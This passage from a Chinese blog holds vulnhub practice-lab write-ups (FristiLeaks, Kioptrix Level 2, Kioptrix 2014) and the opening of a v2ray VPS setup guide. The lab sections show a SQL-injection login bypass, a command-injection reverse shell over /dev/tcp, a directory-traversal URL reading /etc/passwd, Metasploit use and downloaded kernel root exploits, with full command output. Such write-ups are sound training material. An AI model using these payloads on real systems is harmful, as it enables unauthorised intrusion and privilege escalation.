<p>于是进入root的shell终端，拿到flag：<code>Y0u_kn0w_y0u_l0ve_fr1st1</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-bash-4.1$ ^[[Asudo -u fristi /var/fristigod/.secret_admin_stuff/doCom id^^//bbiinn//bbaasshh</span><br><span class="line"></span><br><span class="line">bash-4.1# ccdd  //rroooott</span><br><span class="line"></span><br><span class="line">bash-4.1# llss</span><br><span class="line"></span><br><span class="line">fristileaks_secrets.txt</span><br><span class="line">bash-4.1# ccaatt  ffrrii        stileaks_secrets.txt </span><br><span class="line"></span><br><span class="line">Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]</span><br><span class="line"></span><br><span class="line">I wonder if you beat it in the maximum 4 hours it&#x27;s supposed to take!</span><br><span class="line"></span><br><span class="line">Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Flag: Y0u_kn0w_y0u_l0ve_fr1st1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bash-4.1# wwhhooaammii</span><br><span class="line"></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>主要学习利用本地文件上传漏洞，上传php反弹shell脚本（kali自带的webshell脚本）。<br><code>python  -c  &#39;import  pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>这条命令可以将不完全的shell变为完全shell。<br>通过命令历史，找到提权的方式。</p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://kongwenbin.wordpress.com/2017/12/31/write-up-for-fristileaks-v1-3-vulnhub/">https://kongwenbin.wordpress.com/2017/12/31/write-up-for-fristileaks-v1-3-vulnhub/</a></p>
]]></content>
      <categories>
        <category>vulnhub靶机练习</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
        <tag>FristiLeaks_1.3</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机练习之Kioptix Level 2</title>
    <url>//posts/ZH-CN/Vulnhub_Kioptrix_Two.html</url>
    <content><![CDATA[<h2 id="探测靶机"><a href="#探测靶机" class="headerlink" title="探测靶机"></a>探测靶机</h2><p>这台靶机的版本是centos4.5，要更改虚拟机文件<code>CentOs4.5.vmx</code>，将<code>ethernet0.networkName = &quot;Bridged&quot;</code>改成<code>ethernet0.networkName = &quot;Nat&quot;</code>。这样改了之后，我们就能探测到靶机IP了。</p>
<p><escape> <span id="more"></span></escape></p>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc7g3ugsnrj313d0lljt3.jpg" alt="image.png"><br>使用<code>sudo arp-scan -l</code>探测到靶机IP为192.168.80.16。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:b2:07:af, IPv4: 192.168.80.14</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.80.1    00:50:56:c0:00:08       VMware, Inc.</span><br><span class="line">192.168.80.2    00:50:56:fc:96:a7       VMware, Inc.</span><br><span class="line">192.168.80.16   00:0c:29:6d:00:a3       VMware, Inc.</span><br><span class="line">192.168.80.254  00:50:56:f8:e1:4e       VMware, Inc.</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.073 seconds (123.49 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>
<h2 id="进一步扫描"><a href="#进一步扫描" class="headerlink" title="进一步扫描"></a>进一步扫描</h2><p>使用<code>sudo nmap -sS -T5 -Pn 192.168.80.16</code>扫描，发现靶机开放的端口及服务如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -sS -T5 -Pn 192.168.80.16</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-24 01:02 EST</span><br><span class="line">Nmap scan report for 192.168.80.16</span><br><span class="line">Host is up (0.0017s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">443/tcp  open  https</span><br><span class="line">631/tcp  open  ipp</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">MAC Address: 00:0C:29:6D:00:A3 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 2.44 seconds</span><br></pre></td></tr></table></figure>
<p>nmap扫描详细信息，输入命令<code>sudo nmap -A -T5 -sS 192.168.80.16</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -A -T5 -sS 192.168.80.16</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-24 01:15 EST</span><br><span class="line">Nmap scan report for 192.168.80.16</span><br><span class="line">Host is up (0.0010s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">22/tcp   open  ssh        OpenSSH 3.9p1 (protocol 1.99)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)</span><br><span class="line">|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)</span><br><span class="line">|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)</span><br><span class="line">|_sshv1: Server supports SSHv1</span><br><span class="line">80/tcp   open  http       Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">|_http-server-header: Apache/2.0.52 (CentOS)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">111/tcp  open  rpcbind    2 (RPC #100000)</span><br><span class="line">443/tcp  open  ssl/https?</span><br><span class="line">|_ssl-date: 2020-02-24T04:06:21+00:00; -2h09m35s from scanner time.</span><br><span class="line">| sslv2: </span><br><span class="line">|   SSLv2 supported</span><br><span class="line">|   ciphers: </span><br><span class="line">|     SSL2_RC4_64_WITH_MD5</span><br><span class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_DES_64_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_WITH_MD5</span><br><span class="line">|_    SSL2_RC4_128_EXPORT40_WITH_MD5</span><br><span class="line">631/tcp  open  ipp        CUPS 1.1</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: PUT</span><br><span class="line">|_http-server-header: CUPS/1.1</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">3306/tcp open  mysql      MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:0C:29:6D:00:A3 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.30</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: -2h09m35s</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.04 ms 192.168.80.16</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 109.12 seconds</span><br></pre></td></tr></table></figure>
<h2 id="80端口可打开网页"><a href="#80端口可打开网页" class="headerlink" title="80端口可打开网页"></a>80端口可打开网页</h2><p>我们用nmap扫描得到的信息是这个靶机存在http服务，于是在浏览器输入192.168.80.16，进入到web界面。<br>这个界面只需要输入用户名和密码即可登入，我们尝试一下万能密码。用户名：<code>&#39;or 1=1#</code>，成功进入管理台。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc7h1zn9v8j30xz0m30tw.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc7h1j93jcj31f60p5wkn.jpg" alt="image.png"></p>
<h2 id="利用提交功能反弹靶机shell"><a href="#利用提交功能反弹靶机shell" class="headerlink" title="利用提交功能反弹靶机shell"></a>利用提交功能反弹靶机shell</h2><p>攻击机监听4444端口，web界面提交<code>ping 192.168.80.14; bash -i &gt;&amp; /dev/tcp/192.168.80.14/4444 0&gt;&amp;1</code>。反弹shell是用bash脚本<code>bash -i &gt;&amp; /dev/tcp/192.168.80.14/4444 0&gt;&amp;1</code>实现的。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ nc -lvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">192.168.80.16: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.80.14] from (UNKNOWN) [192.168.80.16] 43719</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">bash-3.00$ whoami</span><br><span class="line">apache</span><br><span class="line">bash-3.00$ pwd</span><br><span class="line">/var/www/html</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc7hbaqxnfj317k0iqtgv.jpg" alt="image.png"></p>
<ul>
<li>拓展知识（各种反弹shell的方法）<br><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">参考</a><h2 id="找到内核漏洞"><a href="#找到内核漏洞" class="headerlink" title="找到内核漏洞"></a>找到内核漏洞</h2>从刚刚获取到的shell，我们看看靶机操作系统的内核信息，发现这个内核版本发行期是2007年，so old……<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash-3.00$ uname -a</span><br><span class="line">Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux</span><br></pre></td></tr></table></figure>
于是在<a href="https://www.exploit-db.com/exploits/9545">网上</a>找到这个内核版本的漏洞利用方法。把这个漏洞利用脚本下载到攻击机：<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ wget https://www.exploit-db.com/download/9545</span><br><span class="line">--2020-02-24 01:41:53--  https://www.exploit-db.com/download/9545</span><br><span class="line">Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8</span><br><span class="line">Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: unspecified [application/txt]</span><br><span class="line">Saving to: ‘9545’</span><br><span class="line"></span><br><span class="line">9545                           [ &lt;=&gt;                                   ]   9.55K  --.-KB/s    in 0s      </span><br><span class="line"></span><br><span class="line">2020-02-24 01:41:58 (25.7 MB/s) - ‘9545’ saved [9783]</span><br></pre></td></tr></table></figure>
攻击机：<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ mv 9545 exploit.c</span><br><span class="line">kali@kali:~$ sudo mv exploit.c /var/www/html/ #将漏洞利用脚本放到web目录</span><br><span class="line">[sudo] password for kali: </span><br><span class="line">kali@kali:~$ /etc/init.d/apache2 start #开启apache服务</span><br><span class="line">Starting apache2 (via systemctl): apache2.service.</span><br></pre></td></tr></table></figure>
靶机shell从攻击机下载exploit：<code>curl 192.168.80.14/exploit.c -o exploit.c</code>。运行这个exp即可获取到靶机root权限。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash-3.00$ cd /tmp &amp;&amp; id &amp;&amp; curl 192.168.80.14/exploit.c -o exploit.c 2&gt; /dev/null &amp;&amp; gcc exploit.c &amp;&amp; ./a.out</span><br><span class="line">uid=48(apache) gid=48(apache) groups=48(apache)</span><br><span class="line">exploit.c:376:28: warning: no newline at end of file</span><br><span class="line">sh: no job control in this shell</span><br><span class="line">sh-3.00# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><a href="https://v3ded.github.io/ctf/kioptrix2.html">https://v3ded.github.io/ctf/kioptrix2.html</a><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>从这台靶机练习，主要学习怎么反弹shell。遇到简单的web登录界面，首先尝试万能密码是否能登入系统。<br>用户提交的内容是shell脚本（如：ping命令）这种情况，我们得明白<code>;</code>可以连接多个shell脚本，并且服务器会依次执行脚本。根据这个原理，我们把恶意脚本（如反弹shell的脚本）放到<code>;</code>后面，就可以欺骗服务器执行恶意脚本。<br>靶机的操作系统版本较低时，在网上找相关版本的内核漏洞，进行利用。</li>
</ul>
]]></content>
      <categories>
        <category>vulnhub靶机练习</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
        <tag>Kioptix Level 2</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机练习之Kioptrix2014</title>
    <url>//posts/ZH-CN/Vulnhub_Kioptrix_2014.html</url>
    <content><![CDATA[<h2 id="探测靶机"><a href="#探测靶机" class="headerlink" title="探测靶机"></a>探测靶机</h2><p>修改vmdx文件，将<code>ethernet0.connectionType = &quot;bridged&quot;</code>改为<code>ethernet0.connectionType = &quot;nat&quot;</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcazov7krkj313d0lldh9.jpg" alt="image.png"><br>改了网卡连接模式之后，居然还是探测不到这个靶机的IP。</p>
<p><escape> <span id="more"></span></escape></p>
<p>在网上找了很久，终于找到一个<a href="https://www.icekam.com/post/kioptrix-2014-5-vulnhub-ctf-penetration-test-record/">有效方法</a>。在打开靶机之前，删除网卡，重新添加网卡。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcb2iho01vj30nw0q3jsg.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcb2kcwuorj30nw0q33zy.jpg" alt="image.png"><br>官方文档也说了这个靶机使用之前要删除网卡重新添加网卡😥😥😥<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcb3vc7sjuj31f60u01cv.jpg" alt="image.png"><br>我们使用<code>sudo arp-scan -l</code>扫描得到靶机IP：192.168.80.20。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo arp-scan -l</span><br><span class="line">[sudo] password for kali: </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:b2:07:af, IPv4: 192.168.80.14</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.80.1    00:50:56:c0:00:08       VMware, Inc.</span><br><span class="line">192.168.80.2    00:50:56:fc:96:a7       VMware, Inc.</span><br><span class="line">192.168.80.17   00:0c:29:fe:3a:82       VMware, Inc.</span><br><span class="line">192.168.80.20   00:0c:29:c1:0a:95       VMware, Inc.</span><br><span class="line">192.168.80.254  00:50:56:f8:e1:4e       VMware, Inc.</span><br><span class="line"></span><br><span class="line">5 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.436 seconds (105.09 hosts/sec). 5 responded</span><br></pre></td></tr></table></figure>
<h2 id="使用nmap扫描"><a href="#使用nmap扫描" class="headerlink" title="使用nmap扫描"></a>使用nmap扫描</h2><p>输入命令（<code>sudo nmap -A -T5 -sS 192.168.80.20</code>）扫描，发现靶机开启的服务端口有：22（ssh端口）、80（http端口）、8080（http端口）。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -A -T5 -sS 192.168.80.20</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-27 04:32 EST</span><br><span class="line">Nmap scan report for 192.168.80.20</span><br><span class="line">Host is up (0.0033s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT     STATE  SERVICE VERSION</span><br><span class="line">22/tcp   closed ssh</span><br><span class="line">80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</span><br><span class="line">8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</span><br><span class="line">MAC Address: 00:0C:29:C1:0A:95 (VMware)</span><br><span class="line">Device type: general purpose|specialized|storage-misc</span><br><span class="line">Running (JUST GUESSING): FreeBSD 9.X|10.X|7.X|8.X|6.X (93%), AVtech embedded (91%), Linux 2.6.X (90%)</span><br><span class="line">OS CPE: cpe:/o:freebsd:freebsd:9 cpe:/o:freebsd:freebsd:10 cpe:/o:linux:linux_kernel:2.6 cpe:/o:freebsd:freebsd:7 cpe:/o:freebsd:freebsd:8 cpe:/o:freebsd:freebsd:6.2 cpe:/a:nas4free:nas4free cpe:/o:freebsd:freebsd:10.2</span><br><span class="line">Aggressive OS guesses: FreeBSD 9.0-RELEASE - 10.3-RELEASE (93%), FreeBSD 9.3-RELEASE (91%), AVtech Room Alert 26W environmental monitor (91%), Linux 2.6.18 - 2.6.22 (90%), FreeBSD 9.0-RELEASE (90%), FreeBSD 7.0-RELEASE - 9.0-RELEASE (88%), FreeBSD 7.0-RELEASE (87%), FreeBSD 7.1-PRERELEASE 7.2-STABLE (87%), FreeBSD 7.2-RELEASE - 8.0-RELEASE (87%), FreeBSD 9.1-RELEASE or 10.1-RELEASE (87%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   3.33 ms 192.168.80.20</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 58.65 seconds</span><br></pre></td></tr></table></figure>
<h2 id="80端口进入网站页面"><a href="#80端口进入网站页面" class="headerlink" title="80端口进入网站页面"></a>80端口进入网站页面</h2><p>浏览器输入url：192.168.80.20，可以打开页面，看到页面内容只有”It works”。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gccgqmxpeqj30zh0nidh0.jpg" alt="image.png"><br>查看网页源代码，发现注释内容包含了网站的url地址：pChart2.1.3/index.php。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gccgsnncfzj30zl0ncjt1.jpg" alt="image.png"><br>我们访问这个url地址：<a href="http://192.168.80.20/pChart2.1.3/examples/index.php">http://192.168.80.20/pChart2.1.3/examples/index.php</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gccgu4njsnj30zm0mdmzw.jpg" alt="image.png"><br>我们查找pChart2.1.3的漏洞信息，发现它存在目录穿越漏洞。<br>扫盲：pChart是什么？</p>
<blockquote>
<p>pChart是一个开源的图表生成库，主要有3个Class：pChart.class、 pData.class、pCache.class，可生成20多种简单或复杂的图表，支持PNG、JPG、GIF通用图片格式。数据源可以来自于Database、CSV等。使用pChart需要开启<strong>PHP的GD服务</strong>。</p>
</blockquote>
<h3 id="目录穿越漏洞利用"><a href="#目录穿越漏洞利用" class="headerlink" title="目录穿越漏洞利用"></a>目录穿越漏洞利用</h3><p>输入url：<a href="http://192.168.80.20/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwd">http://192.168.80.20/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwd</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gccgwpmxjcj30zj0n577n.jpg" alt="image.png"><br>输入url：<a href="http://192.168.80.20/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf">http://192.168.80.20/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf</a><br>查看http服务的配置文件，发现8080端口的服务只能使用Mozilla4浏览器访问。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gccgyfrjvej30zn0nkgon.jpg" alt="image.png"><br>于是我们使用浏览器插件<code>User-Agent Switcher and Manager</code>设置浏览器的UA为<code>Mozilla/4.0 (compatible; MSIE 4.01; Windows NT 5.0)</code>，就可以访问到192.168.80.20:8080的网页了。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcch0nd67fj30zf0nadj3.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcch2w13rzj30zo0nb0tu.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcch3f5dizj30zo0na7b1.jpg" alt="image.png"></p>
<h3 id="phptax漏洞利用"><a href="#phptax漏洞利用" class="headerlink" title="phptax漏洞利用"></a>phptax漏洞利用</h3><ul>
<li>利用metasploit的msfconsole进入www的shell<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/http/phptax_exec) &gt; search phptax</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                            Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                            ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/multi/http/phptax_exec  2012-10-08       excellent  Yes    PhpTax pfilez Parameter Exec Remote Code Injection</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/http/phptax_exec) &gt; use exploit/multi/http/phptax_exec </span><br><span class="line">msf5 exploit(multi/http/phptax_exec) &gt; set rhost 192.168.80.20</span><br><span class="line">rhost =&gt; 192.168.80.20</span><br><span class="line">msf5 exploit(multi/http/phptax_exec) &gt; set rport 8080</span><br><span class="line">rport =&gt; 8080</span><br><span class="line">msf5 exploit(multi/http/phptax_exec) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP double handler on 192.168.80.14:4444 </span><br><span class="line">[*] 192.168.80.208080 - Sending request...</span><br><span class="line">[*] Accepted the first client connection...</span><br><span class="line">[*] Accepted the second client connection...</span><br><span class="line">[*] Accepted the first client connection...</span><br><span class="line">[*] Accepted the second client connection...</span><br><span class="line">[*] Command: echo 0IWlXDD6mroOHlbm;</span><br><span class="line">[*] Writing to socket A</span><br><span class="line">[*] Writing to socket B</span><br><span class="line">[*] Reading from sockets...</span><br><span class="line">[*] Reading from socket A</span><br><span class="line">[*] A: &quot;Connected: not found\r\nEscape: not found\r\n0IWlXDD6mroOHlbm\r\n&quot;</span><br><span class="line">[*] Command: echo YmB6B5cAUuGNENTP;</span><br><span class="line">[*] Writing to socket A</span><br><span class="line">[*] Writing to socket B</span><br><span class="line">[*] Reading from sockets...</span><br><span class="line">[*] Reading from socket A</span><br><span class="line">[*] A: &quot;Connected: not found\r\nEscape: not found\r\nYmB6B5cAUuGNENTP\r\n&quot;</span><br><span class="line">[*] Matching...</span><br><span class="line">[*] B is input...</span><br><span class="line">[*] Matching...</span><br><span class="line">[*] B is input...</span><br><span class="line">[*] Command shell session 14 opened (192.168.80.14:4444 -&gt; 192.168.80.20:56563) at 2020-02-28 09:17:27 -0500</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">www</span><br><span class="line">uname -a</span><br><span class="line">FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64</span><br></pre></td></tr></table></figure></li>
<li>提权root<br>我们根据<code>uname -a</code>的结果，查找到FreeBSD 9.0存在内核漏洞，在<a href="https://www.exploit-db.com/download/28718">网上</a>找到exp脚本，并执行exp利用漏洞。<ul>
<li>攻击机<br>下载exp到本地，将exp脚本命名为<code>vvv.c</code>。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ wget https://www.exploit-db.com/download/28718</span><br><span class="line">kali@kali:~$ mv 28718 vvv.c</span><br></pre></td></tr></table></figure>
监听端口6666：<br>kali@kali:~$ nc -lvp 6666 &lt; vvv.c </li>
<li>靶机<br>利用刚刚www的shell，通过6666端口从攻击机下载exp到本地，并执行exp脚本。（注意：<code>nc -nv 192.168.80.14 6666 -w 5 &gt; vvv.c</code>中的<code>w</code>是设置超时时间，<code>-w 5</code>意思就是超时时间设置为5秒。设置超时时间是为了确保从攻击机成功下载exp。）<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -nv 192.168.80.14 6666 -w 5 &gt; vvv.c</span><br><span class="line">Connection to 192.168.80.14 6666 port [tcp/*] succeeded!</span><br><span class="line">gcc vvv.c</span><br><span class="line">vvv.c:178:2: warning: no newline at end of file</span><br><span class="line">./a.out</span><br><span class="line">[+] SYSRET FUCKUP!!</span><br><span class="line">[+] Start Engine...</span><br><span class="line">[+] Crotz...</span><br><span class="line">[+] Crotz...</span><br><span class="line">[+] Crotz...</span><br><span class="line">[+] Woohoo!!!</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>主要学习了靶机从攻击机下载exp脚本的方法，以及目录穿越漏洞的利用方式。对于插件版本、内核版本要格外留意，在网上查找对应版本是否存在漏洞可利用。nc命令要熟练运用，这个命令常用于反弹shell。</p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://kongwenbin.wordpress.com/2016/11/02/writeup-for-kioptrix-2014-5/">https://kongwenbin.wordpress.com/2016/11/02/writeup-for-kioptrix-2014-5/</a></p>
]]></content>
      <categories>
        <category>vulnhub靶机练习</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
        <tag>Kioptix2014</tag>
      </tags>
  </entry>
  <entry>
    <title>vultr购买VPS自建v2ray详细过程</title>
    <url>//posts/ZH-CN/Vultr_Vps_V2ray.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>科学上网越来越难。自建梯子的想法很早就有，今天实践一盘。搜罗网上各种教程，最终买的是vultr的VPS。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="vps购买"><a href="#vps购买" class="headerlink" title="vps购买"></a>vps购买</h2><p><a href="https://my.vultr.com/">官网</a>，现在新用户注册赠送100美金（有效期一个月），使用之前，必须先充值10美金，支持支付宝付款。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcwzpctxmxj31f60q677t.jpg" alt="image.png"></p>
<h2 id="创建实例"><a href="#创建实例" class="headerlink" title="创建实例"></a>创建实例</h2><p>我选择的是美国迈阿密的服务器，<code>ubuntu18.04 64位</code>的系统（不是乱选的，参考了<a href="https://yuan.ga/v2ray-complete-tutorial/">网上的建议</a>）。<br>现在选的是最便宜的那种：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcwzu0qw9nj319d0jnwfz.jpg" alt="image.png"></p>
<h2 id="修改root密码"><a href="#修改root密码" class="headerlink" title="修改root密码"></a>修改root密码</h2><p>参考<a href="https://zhuanlan.zhihu.com/p/35779715">这篇文章</a>修改的。<br>首先要进入web console界面：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcwzzbf31ej31a80kxjsu.jpg" alt="image.png"><br>根据文章里面ubuntu系统部分的操作进行即可。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcwyxwuqn7j30q90i1gn0.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcwz0xckn4j30q90i176j.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcwz3wenqpj30pl0u0784.jpg" alt="image.png"></p>
<h2 id="开启ssh服务"><a href="#开启ssh服务" class="headerlink" title="开启ssh服务"></a>开启ssh服务</h2><p>此时，用远程工具ssh这台服务器，是无法连接的。为啥？检查一下，服务器的ssh服务并没有开启？！（超出我的预料啊……），果断开启ssh服务。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcwza5sw42j30pl0u0djc.jpg" alt="image.png"></p>
<h2 id="重启服务器"><a href="#重启服务器" class="headerlink" title="重启服务器"></a>重启服务器</h2><p>刚刚修改了root密码，开启了ssh服务，都不是立刻就能生效的。我们得重启服务器，使得刚才的配置生效。（<strong>注意：</strong>在终端是无法进行reboot操作的，只能在web界面重启）<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcx011g43nj319o0ju75p.jpg" alt="image.png"></p>
<h2 id="远程连接vps"><a href="#远程连接vps" class="headerlink" title="远程连接vps"></a>远程连接vps</h2><p>现在就可以使用远程连接工具，连接到vps了。ssh的默认端口是22。输入刚才更新的root密码，这就连上去了。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcx02lu1srj30nv0izgnb.jpg" alt="image.png"></p>
<h2 id="官方脚本安装v2ray"><a href="#官方脚本安装v2ray" class="headerlink" title="官方脚本安装v2ray"></a>官方脚本安装v2ray</h2><p>输入命令：<code>bash &lt;(curl -L -s https://install.direct/go.sh)</code>官方脚本自动安装v2ray。</p>
<details><summary>点击展开安装过程</summary>
<p>

